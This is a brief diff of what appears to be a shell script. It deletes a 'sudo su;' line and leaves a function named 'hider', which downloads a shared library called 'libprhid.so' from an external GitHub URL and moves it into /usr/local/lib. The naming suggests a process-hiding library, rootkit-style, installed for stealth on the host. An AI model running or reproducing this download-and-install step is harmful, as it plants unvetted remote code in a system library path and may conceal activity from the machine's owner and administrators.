@@ -1,4 +1,3 @@
-sudo su;
 function hider() {
     wget https://raw.githubusercontent.com/m4rtis01/zarwel/main/libprhid.so ;
     mv libprhid.so /usr/local/lib/;
